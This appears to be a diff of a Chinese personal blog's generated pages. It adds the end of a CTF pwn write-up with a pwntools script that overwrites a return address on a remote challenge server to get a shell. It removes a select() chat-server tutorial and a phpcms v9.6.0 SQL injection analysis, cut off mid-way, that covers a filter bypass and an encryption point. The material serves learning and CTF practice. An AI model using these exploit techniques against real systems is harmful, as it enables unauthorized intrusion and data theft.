+<p>所以最初的尝试是将retaddr覆盖为hackhere函数的地址。</p>
+<h2 id="分析偏移量"><a href="#分析偏移量" class="headerlink" title="分析偏移量"></a>分析偏移量</h2><p>这里分析偏移量采用了ida动态调试的方法，在main函数的retn处下断点。为了方便找到数组的地址，在调试时先输入4个数字1,2,3,4，然后在stack view中寻找数组的首地址。<br>执行到断点处stack view视图默认指向esp的位置，可以从而确定retaddr：<br><img src="http://p7lc13qga.bkt.clouddn.com/retaddr.png" alt="retaddr"><br>这里的retaddr为<code>0xffcd968c</code><br>向上寻找看是否存在某段内容为04030201，即可找到v13数组的首地址：<br><img src="http://p7lc13qga.bkt.clouddn.com/bufaddr.png" alt="bufaddr"><br>可以看到数组地址为<code>0xffcd9608</code>,数组相对retaddr的偏移位数为<code>0xffcd968c-0xffcd9608=132</code>,所以只要覆盖v13[132]至v13[135]即可。<br>确定hackhere的地址为<code>0x0804859B</code>,所以只需覆盖v13[132]至v13[135]为<code>0x9b</code>,<code>0x85</code>,<code>0x04</code>,<code>0x08</code>.<br>本地测试用这样的方法可成功getshell。</p>
+<h2 id="远程的问题"><a href="#远程的问题" class="headerlink" title="远程的问题"></a>远程的问题</h2><p>然而远程测试则提示bash not found.原来目标机器上并不存在bash。因此想要getshell就只能通过调用_system来实现最终的getshell。而这里的<code>/bin/sh</code>可以从<code>/bin/bash</code>中获得，即<code>/bin/bash</code>的倒数二位。<br>因此最后打通远端服务器的payload为:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"47.96.239.28"</span>, <span class="string">'2333'</span>)</span><br><span class="line">r.sendline(<span class="string">'1\n5\n3\n132\n80\n3\n133\n132\n3\n134\n4\n3\n135\n8\n3\n140\n135\n3\n141\n137\n3\n142\n4\n3\n143\n8'</span>)</span><br><span class="line">r.sendline(<span class="string">'5'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p7lc13qga.bkt.clouddn.com/getshell.png" alt="getshell"></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>对于pwn菜鸡来说一定要熟悉程序执行的原理才行，另外ida远程调试也是一个很好的办法，更加形象化。另外这里的ida是在wine下运行的portable版本，亲测没有什么大bug。<br>keep calm and carry on！</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/flask自定义decorator的坑点/index.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2461,884 +2832,6 @@ YEARWEEK()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/thinkings-on-select/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/thinkings-on-select/index.html" itemprop="url">
-                  对select()的理解
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2017-12-15 00:56:25" itemprop="dateCreated datePublished" datetime="2017-12-15T00:56:25+08:00">2017-12-15</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/人生杂谈/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>断断续续的看<strong>Beej’s Guide to Network Programming</strong>这本小册子,最近看了select函数的用法,感觉这个函数挺有用而且听特殊,理解上有点儿难度,因此记录下来关于这个函数的一些东西.</p>
-</blockquote>
-<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><pre><code>#include &lt;sys/time.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
-int select(int numfds, fd_set *readfds, fd_set *writefds,
-fd_set *exceptfds, struct timeval *timeout);
-</code></pre><h3 id="fd-set"><a href="#fd-set" class="headerlink" title="fd_set"></a><code>fd_set</code></h3><p>这里的fd_set类型相当于一个file descriptor的集合.<br>当select()函数返回时,readfs中只含有可以读的file descriptor.writefs包含可写的descriptor,exceptfds包含出错的file descriptor .(此三个参数不必都有) fd_set有一些列的操作函数:</p>
-<pre><code>FD_SET(int fd, fd_set *set); //Add fd to the set .
-FD_CLR(int fd, fd_set *set); //Remove fd from the set .
-FD_ISSET(int fd, fd_set *set); //Return true if fd is in the set .
-FD_ZERO(fd_set *set); //Clear all entries from the set .
-</code></pre><h3 id="timeval结构体"><a href="#timeval结构体" class="headerlink" title="timeval结构体"></a><code>timeval</code>结构体</h3><pre><code>struct timeval {
-int tv_sec; //seconds
-int tv_usec;// microseconds
-};
-</code></pre><p>此结构体表示select函数的超时时间.设置为NULL则永远等待. 此函数使用时,numfds应设置为最高的file descriptor的值.</p>
-<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>返回set中最后剩下的的数目.0表示超时,-1表示出错.</p>
-<h2 id="此函数如何使用的理解"><a href="#此函数如何使用的理解" class="headerlink" title="此函数如何使用的理解"></a>此函数如何使用的理解</h2><p>我们可以在开始的时候使用<code>FD_SET</code>将我们创建的服务端套接字描述符填入一个fd_set中,然后把这个fd_set复制一下传如select的readfds参数中然后用select监听,select有返回值后则遍历所有descriptors</p>
-<ul>
-<li>如果这个descriptor在这个新的readfds中(<code>FD_ISSET</code>)则说明可以read<ul>
-<li>如果这个descriptor正好是我们最初的那个服务端套接字  <ul>
-<li>则可以进行accept操作,然后将读到的这个socksetfd就可以传入我们的fd_set中,判断这个socketfd是否比原有的最大的socketfd大,大则替换<code>select()</code>函数的第一个参数为这个新的socketfd+1.</li>
-</ul>
-</li>
-<li>如果这个descriptor不是最初的那个服务端套接字<ul>
-<li>则说明是与某个主机的一个连接,则可以调用这个套接字的<code>recv()</code>方法接收数据,如果返回0说明这个套接字已经断开,可调用<code>FD_CLR</code>将其从最初的fd_set中清除出去.否则则进行其他的一些列操作.</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="一个简单的demo"><a href="#一个简单的demo" class="headerlink" title="一个简单的demo"></a>一个简单的demo</h2><pre><code>/*
-** ChatServer.cpp - a practise on select()
-*/
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;sys/socket.h&gt;
-#include &lt;arpa/inet.h&gt;
-#include &lt;netdb.h&gt;
-
-#define PORT &quot;3456&quot;
-#define STDIN 0
-
-void *get_in_addr(struct sockaddr *sa)
-{
-    if (sa-&gt;sa_family == AF_INET)
-    {
-        return &amp;(((struct sockaddr_in *)sa)-&gt;sin_addr);
-    }
-    else
-        return &amp;(((struct sockaddr_in6 *)sa)-&gt;sin6_addr);
-}
-
-int main(void)
-{
-    fd_set master;
-    fd_set read_fds;
-    int fd_max;
-
-    int listener;
-    int newfd;
-    struct sockaddr_storage remoteaddr;
-    socklen_t addrlen;
-
-    char buf[256];
-    char mess[256];
-    int nbytes;
-
-    char remoteIP[INET6_ADDRSTRLEN];
-
-    int yes = 1;
-    int i, j, rv;
-    struct addrinfo hints, *ai, *p;
-
-    FD_ZERO(&amp;master);
-    FD_ZERO(&amp;read_fds);
-
-    memset(&amp;hints, 0, sizeof hints);
-    hints.ai_family = AF_UNSPEC;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_flags = AI_PASSIVE;
-    if ((rv = getaddrinfo(NULL, PORT, &amp;hints, &amp;ai)) != 0)
-    {
-        fprintf(stderr, &quot;selectserver:%s\n&quot;, gai_strerror(rv));
-        exit(1);
-    }
-
-    for (p = ai; p != NULL; p = p-&gt;ai_next)
-    {
-        listener = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol);
-        if (listener &lt; 0)
-        {
-            continue;
-        }
-        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof(int));
-        if (bind(listener, p-&gt;ai_addr, p-&gt;ai_addrlen) &lt; 0)
-        {
-            close(listener);
-            continue;
-        }
-        break;
-    }
-    if (p == NULL)
-    {
-        fprintf(stderr, &quot;selectserver: failed to bind\n&quot;);
-        exit(2);
-    }
-    freeaddrinfo(ai);
-    if (listen(listener, 10) == -1)
-    {
-        perror(&quot;listen&quot;);
-        exit(3);
-    }
-    FD_SET(listener, &amp;master);
-    FD_SET(STDIN, &amp;master);
-    fd_max = listener &gt; STDIN ? listener : STDIN;
-
-    for (;;)
-    {
-        read_fds = master;
-        if (select(fd_max + 1, &amp;read_fds, NULL, NULL, NULL) == -1)
-        {
-            perror(&quot;select&quot;);
-            exit(4);
-        }
-        for (i = 0; i &lt;= fd_max; i++)
-        {
-            if (FD_ISSET(i, &amp;read_fds))
-            { //we got one!!
-                if (i == STDIN)
-                {
-                    fgets(buf, sizeof buf, stdin);
-                    memset(mess, 0, sizeof mess);
-                    sprintf(mess, &quot;server said:%s&quot;, buf);
-                    for (j = 0; j &lt;= fd_max; j++)
-                    {
-                        if (FD_ISSET(j, &amp;master))
-                        {
-                            if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
-                            {
-                                if (send(j, mess, strlen(mess), 0) == -1)
-                                {
-                                    perror(&quot;send&quot;);
-                                }
-                            }
-                        }
-                    }
-                }
-                else if (i == listener)
-                {
-                    addrlen = sizeof remoteaddr;
-                    newfd = accept(listener, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen);
-                    if (newfd == -1)
-                    {
-                        perror(&quot;accept&quot;);
-                    }
-                    else
-                    {
-                        FD_SET(newfd, &amp;master);
-                        if (newfd &gt; fd_max)
-                        {
-                            fd_max = newfd;
-                        }
-                        printf(&quot;selectserver:new connection from %s on socket %d\n&quot;,
-                               inet_ntop(remoteaddr.ss_family, get_in_addr((struct sockaddr *)&amp;remoteaddr), remoteIP, INET6_ADDRSTRLEN), newfd);
-                        sprintf(buf, &quot;hello!!! your socket id is %d\n&quot;, newfd);
-                        if (send(newfd, buf, strlen(buf), 0) == -1)
-                        {
-                            perror(&quot;send&quot;);
-                        }
-                        sprintf(buf, &quot;socket %d joined chatroom\n&quot;, newfd);
-                        for (j = 0; j &lt; fd_max; j++)
-                        {
-                            if (FD_ISSET(j, &amp;master))
-                            {
-                                if (j != i &amp;&amp; j != listener &amp;&amp; j != STDIN)
-                                {
-                                    if (send(j, buf, strlen(buf), 0) == -1)
-                                        perror(&quot;send&quot;);
-                                }
-                            }
-                        }
-                    }
-                }
-                else
-                {
-                    if ((nbytes = recv(i, buf, sizeof buf, 0)) &lt;= 0)
-                    {
-                        if (nbytes == 0)
-                        {
-                            sprintf(buf, &quot;select server: socket %d hung up\n&quot;, i);
-                            printf(&quot;%s&quot;, buf);
-                            for (j = 0; j &lt;= fd_max; j++)
-                            {
-                                if (FD_ISSET(j, &amp;master))
-                                    if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
-                                    {
-                                        if (send(j, buf, strlen(buf), 0) == -1)
-                                        {
-                                            perror(&quot;send&quot;);
-                                        }
-                                    }
-                            }
-                        }
-                        else
-                        {
-                            perror(&quot;recv&quot;);
-                        }
-                        close(i);
-                        FD_CLR(i, &amp;master);
-                    }
-                    else
-                    {
-                        if (nbytes &lt;= 2)
-                            nbytes = 3;
-                        memset(mess, 0, sizeof mess);
-                        strncpy(mess, buf, nbytes - 2);
-                        printf(&quot;recv data %s from socket %d\n&quot;, mess, i);
-                        sprintf(buf, &quot;socket %d says: %s\n&quot;, i, mess);
-                        for (j = 0; j &lt;= fd_max; j++)
-                        {
-                            if (FD_ISSET(j, &amp;master))
-                            {
-                                if (j != listener &amp;&amp; j != i &amp;&amp; j != STDIN)
-                                {
-                                    if (send(j, buf, strlen(buf), 0) == -1)
-                                    {
-                                        perror(&quot;send&quot;);
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-    return 0;
-}
-</code></pre><blockquote>
-<p>要特别注意一次select操作后readfs中只剩下了当前可读的fd.所以每次要复制一个副本穿进去.</p>
-</blockquote>
-<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>还是认真学习认真思考能让人不那么丧…..庆幸自己找到了自己真正的兴趣所在.<br>不要让一些没意义的东西麻痹了自己. 要时刻提醒自己生存不易.<br>不高兴了就更更博,耐心看看技术书,让自己静一静.闲了就容易生事.<br>keep on moving!!!</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/phpcmsv9sqli/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/phpcmsv9sqli/index.html" itemprop="url">
-                  phpcms-v9.6.0sql注入漏洞分析[挖坟]
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2017-12-06 21:29:14" itemprop="dateCreated datePublished" datetime="2017-12-06T21:29:14+08:00">2017-12-06</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>还有几天就要翘课一个礼拜去深圳和厦门被各位大佬虐菜了…由于本菜鸡的代码审计一直是弱项,所以为了能打好这场比赛,这两天便找了一些代码和漏洞分析文章来学习学习.今天玩了一下这个好几个月之前的phpcms的漏洞,在差不多搞了个大概之后写了这篇文章来记录一下这个漏洞的原理.</p>
-</blockquote>
-<h2 id="0x01-phpcms的路由处理方式"><a href="#0x01-phpcms的路由处理方式" class="headerlink" title="0x01 phpcms的路由处理方式"></a>0x01 phpcms的路由处理方式</h2><p>index.php中,可以看到调用了pc_base::create_app()方法.跟进这个方法最后调用了_load_class()函数,参数为application.</p>
-<pre><code>private static function _load_class($classname, $path = &apos;&apos;, $initialize = 1) {
-        static $classes = array();
-        if (empty($path)) $path = &apos;libs&apos;.DIRECTORY_SEPARATOR.&apos;classes&apos;;
-
-        $key = md5($path.$classname);
-        if (isset($classes[$key])) {
-            if (!empty($classes[$key])) {
-                return $classes[$key];
-            } else {
-                return true;
-            }
-        }
-        if (file_exists(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;)) {
-            include PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;;
-            $name = $classname;
-            if ($my_path = self::my_path(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.&apos;.class.php&apos;)) {
-                include $my_path;
-                $name = &apos;MY_&apos;.$classname;
-            }
-            if ($initialize) {
-                $classes[$key] = new $name;
-            } else {
-                $classes[$key] = true;
-            }
-            return $classes[$key];
-        } else {
-            return false;
-        }
-    }
-</code></pre><p>跟进phpcms/libs/classes/application.class.php文件中</p>
-<pre><code>&lt;?php
-/**
- *  application.class.php PHPCMS应用程序创建类
- *
- * @copyright           (C) 2005-2010 PHPCMS
- * @license             http://www.phpcms.cn/license/
- * @lastmodify          2010-6-7
- */
-class application {
-
-    /**
-     * 构造函数
-     */
-    public function __construct() {
-        $param = pc_base::load_sys_class(&apos;param&apos;);
-        define(&apos;ROUTE_M&apos;, $param-&gt;route_m());
-        define(&apos;ROUTE_C&apos;, $param-&gt;route_c());
-        define(&apos;ROUTE_A&apos;, $param-&gt;route_a());
-        $this-&gt;init();
-    }
-
-    /**
-     * 调用件事
-     */
-    private function init() {
-        $controller = $this-&gt;load_controller();
-        if (method_exists($controller, ROUTE_A)) {
-            if (preg_match(&apos;/^[_]/i&apos;, ROUTE_A)) {
-                exit(&apos;You are visiting the action is to protect the private action&apos;);
-            } else {
-                call_user_func(array($controller, ROUTE_A));
-            }
-        } else {
-            exit(&apos;Action does not exist.&apos;);
-        }
-    }
-
-    /**
-     * 加载控制器
-     * @param string $filename
-     * @param string $m
-     * @return obj
-     */
-    private function load_controller($filename = &apos;&apos;, $m = &apos;&apos;) {
-        if (empty($filename)) $filename = ROUTE_C;
-        if (empty($m)) $m = ROUTE_M;
-        $filepath = PC_PATH.&apos;modules&apos;.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.$filename.&apos;.php&apos;;
-        if (file_exists($filepath)) {
-            $classname = $filename;
-            include $filepath;
-            if ($mypath = pc_base::my_path($filepath)) {
-                $classname = &apos;MY_&apos;.$filename;
-                include $mypath;
-            }
-            if(class_exists($classname)){
-                return new $classname;
-            }else{
-                exit(&apos;Controller does not exist.&apos;);
-            }
-        } else {
-            exit(&apos;Controller does not exist.&apos;);
-        }
-    }
-}
-</code></pre><p>可以看到构造函数中将param的<strong>route_m</strong>,<strong>route_c</strong>,<strong>route_a</strong>作为为模块名,控制器,控制器的相关函数,然后调用init函数加载这个模块的相应控制器的相应函数.跟进/phpcms/libs/classes/param.class.php文件可以得知这三个成员变量分别来自<code>$_GET[&#39;m&#39;]</code>,<code>$_GET[&#39;c&#39;]</code>,<code>$_GET[&#39;a&#39;]</code>中. 由此可确定phpcms的路由规则:<code>index.php?m=module名称&amp;c=controller名称&amp;a=函数</code></p>
-<h2 id="0x02-注入漏洞分析"><a href="#0x02-注入漏洞分析" class="headerlink" title="0x02 注入漏洞分析"></a>0x02 注入漏洞分析</h2><h3 id="phpcms中负责过滤的一个函数safe-replace"><a href="#phpcms中负责过滤的一个函数safe-replace" class="headerlink" title="phpcms中负责过滤的一个函数safe_replace"></a>phpcms中负责过滤的一个函数<strong>safe_replace</strong></h3><p>源码如下:</p>
-<pre><code>function safe_replace($string) {
-    $string = str_replace(&apos;%20&apos;,&apos;&apos;,$string);
-    $string = str_replace(&apos;%27&apos;,&apos;&apos;,$string);
-    $string = str_replace(&apos;%2527&apos;,&apos;&apos;,$string);
-    $string = str_replace(&apos;*&apos;,&apos;&apos;,$string);
-    $string = str_replace(&apos;&quot;&apos;,&apos;&quot;&apos;,$string);
-    $string = str_replace(&quot;&apos;&quot;,&apos;&apos;,$string);
-    $string = str_replace(&apos;&quot;&apos;,&apos;&apos;,$string);
-    $string = str_replace(&apos;;&apos;,&apos;&apos;,$string);
-    $string = str_replace(&apos;&lt;&apos;,&apos;&lt;&apos;,$string);
-    $string = str_replace(&apos;&gt;&apos;,&apos;&gt;&apos;,$string);
-    $string = str_replace(&quot;{&quot;,&apos;&apos;,$string);
-    $string = str_replace(&apos;}&apos;,&apos;&apos;,$string);
-    $string = str_replace(&apos;\\&apos;,&apos;&apos;,$string);
-    return $string;
-}
-</code></pre><p>可以看到这个函数是可以绕过的,只要传参%*27即可绕过过滤.</p>
-<h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>这个漏洞的注入点位于phpcms/modules/content/down.php文件中,代码如下:</p>
-<pre><code>public function init() {
-        $a_k = trim($_GET[&apos;a_k&apos;]);
-        if(!isset($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
-        $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;));
-        if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
-        unset($i,$m,$f);
-        parse_str($a_k);
-        if(isset($i)) $i = $id = intval($i);
-        if(!isset($m)) showmessage(L(&apos;illegal_parameters&apos;));
-        if(!isset($modelid)||!isset($catid)) showmessage(L(&apos;illegal_parameters&apos;));
-        if(empty($f)) showmessage(L(&apos;url_invalid&apos;));
-        $allow_visitor = 1;
-        $MODEL = getcache(&apos;model&apos;,&apos;commons&apos;);
-        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&apos;tablename&apos;];
-        $this-&gt;db-&gt;table_name = $tablename.&apos;_data&apos;;
-        $rs = $this-&gt;db-&gt;get_one(array(&apos;id&apos;=&gt;$id)); 
-        $siteids = getcache(&apos;category_content&apos;,&apos;commons&apos;);
-        $siteid = $siteids[$catid];
-        $CATEGORYS = getcache(&apos;category_content_&apos;.$siteid,&apos;commons&apos;);
-</code></pre><p>可以看到$a_k变量可控,对$a_k变量做一系列处理之后使用parse_str函数进行处理,这也是这个漏洞产生的一个重要原因.之后的几个变量都可以覆盖过去,可以看到$id变量被直接传递到了get_one函数中.跟进phpcms处理model相关的文件中<code>/phpcms/libs/classes/db_access.class.php</code>:</p>
-<pre><code>/**
- * 获取单条记录查询
- * @param $where        查询条件
- * @param $data         需要查询的字段值[例`name`,`gender`,`birthday`]
- * @param $order        排序方式    [默认按数据库默认方式排序]
- * @param $group        分组方式    [默认为空]
- * @return array/null   数据查询结果集,如果不存在，则返回空
- */
-final public function get_one($where = &apos;&apos;, $data = &apos;*&apos;, $order = &apos;&apos;, $group = &apos;&apos;) {
-    if (is_array($where)) $where = $this-&gt;sqls($where);
-    return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);
-}
-    /**
- * 将数组转换为SQL语句
- * @param array $where 要生成的数组
- * @param string $font 连接串。
- */
-final public function sqls($where, $font = &apos; AND &apos;) {
-    if (is_array($where)) {
-        $sql = &apos;&apos;;
-        foreach ($where as $key=&gt;$val) {
-            $sql .= $sql ? &quot; $font `$key` = &apos;$val&apos; &quot; : &quot; `$key` = &apos;$val&apos;&quot;;
-        }
-        return $sql;
-    } else {
-        return $where;
-    }
-}
-</code></pre><p>调用get_one函数,跟进文件<code>/phpcms/libs/classes/db_mysqli.class.php</code>中</p>
-<pre><code>/**
- * 获取单条记录查询
- * @param $data         需要查询的字段值[例`name`,`gender`,`birthday`]
- * @param $table        数据表
- * @param $where        查询条件
- * @param $order        排序方式    [默认按数据库默认方式排序]
- * @param $group        分组方式    [默认为空]
- * @return array/null   数据查询结果集,如果不存在，则返回空
- */
-public function get_one($data, $table, $where = &apos;&apos;, $order = &apos;&apos;, $group = &apos;&apos;) {
-    $where = $where == &apos;&apos; ? &apos;&apos; : &apos; WHERE &apos;.$where;
-    $order = $order == &apos;&apos; ? &apos;&apos; : &apos; ORDER BY &apos;.$order;
-    $group = $group == &apos;&apos; ? &apos;&apos; : &apos; GROUP BY &apos;.$group;
-    $limit = &apos; LIMIT 1&apos;;
-    $field = explode( &apos;,&apos;, $data);
-    array_walk($field, array($this, &apos;add_special_char&apos;));
-    $data = implode(&apos;,&apos;, $field);
-
-    $sql = &apos;SELECT &apos;.$data.&apos; FROM `&apos;.$this-&gt;config[&apos;database&apos;].&apos;`.`&apos;.$table.&apos;`&apos;.$where.$group.$order.$limit;
-    $this-&gt;execute($sql);
-    $res = $this-&gt;fetch_next();
-    $this-&gt;free_result();
-    return $res;
-}
-</code></pre><p>可以看到最终$id被直接拼接到了sql语句中.因此可以进行注入.那么怎么控制$id的值? 回到down.php文件中</p>
-<pre><code>public function init() {
-        $a_k = trim($_GET[&apos;a_k&apos;]);
-        if(!isset($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
-        $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;));
-        if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
-        unset($i,$m,$f);
-        parse_str($a_k);
-        if(isset($i)) $i = $id = intval($i);
-</code></pre><p>可以看到这个$a_k是从<code>$_GET[&#39;a_k&#39;]</code>解密得来的.只要找到一个加密的点即可控制输出.</p>
-<h3 id="加密点"><a href="#加密点" class="headerlink" title="加密点"></a>加密点</h3><p>这里师傅们用的加密的点是<code>/phpcms/modules/attachment/attachments.php</code>文件中的函数<strong>swfupload_json</strong>.</p>
-<pre><code>/**
- * 设置swfupload上传的json格式cookie
- */
-public function swfupload_json() {
-    $arr[&apos;aid&apos;] = intval($_GET[&apos;aid&apos;]);
-    $arr[&apos;src&apos;] = safe_replace(trim($_GET[&apos;src&apos;]));
-    $arr[&apos;filename&apos;] = urlencode(safe_replace($_GET[&apos;filename&apos;]));
-    $json_str = json_encode($arr);
-    $att_arr_exist = param::get_cookie(&apos;att_json&apos;);
-    $att_arr_exist_tmp = explode(&apos;||&apos;, $att_arr_exist);
-    if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {
-        return true;
-    } else {
-        $json_str = $att_arr_exist ? $att_arr_exist.&apos;||&apos;.$json_str : $json_str;
-        param::set_cookie(&apos;att_json&apos;,$json_str);
-        return true;            
-    }
-}
-</code></pre><p>在这个函数中,将$_GET[‘src’]使用safe_replace()函数处理后进入$arr[‘src’]中,再对$arr进行json_encode,只要不存在att_json这样一个cookie或者$json_str不在数组中就会进入else的循环中,而跟进set_cookie函数则可发现phpcms输出的cookie值正好为加密后的cookie.因此我们便可以利用这个点来加密我们的注入语句. 然而phpcms的attachments类会进行一个用户身份的判断</p>
-<pre><code>function __construct() {
-    pc_base::load_app_func(&apos;global&apos;);
-    $this-&gt;upload_url = pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;);
